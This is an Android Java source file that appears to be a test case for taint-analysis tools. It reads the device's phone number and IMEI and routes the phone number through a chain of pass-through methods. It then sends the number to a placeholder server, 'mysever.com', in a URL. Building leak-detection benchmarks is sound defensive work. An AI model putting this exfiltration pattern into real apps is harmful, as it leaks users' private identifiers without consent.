package example.com.tainttest;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;


/**
 * Created by rlaouadi on 27/09/16.
 */
public class TaintTest {

    Context context;


    public TaintTest(Context ctx){
        context = ctx;
    }

    public String k_5(String data){
        return k_4(data);
    }

    public String k_4(String data){
        return k_3(data);
    }

    public String k_3(String data){
        return k_2(data);
    }

    public String k_2(String data){
        return k_1(data);
    }

    public String k_1(String data){
        return data;
    }


    public void doit() {
        imeidata();
        phonenumbersend();
    }

    private void phonenumbersend() {
        TelephonyManager mgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String phone = mgr.getLine1Number();

        String data = k_5(phone);
        send(data);
    }

    private void imeidata(){
        TelephonyManager mgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = mgr.getDeviceId();
        k_5(imei);
    }

    public void send(String data){
        URL url = null;
        try {
            url = new URL("http://www.mysever.com/data="+data);
            url.openConnection();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


}
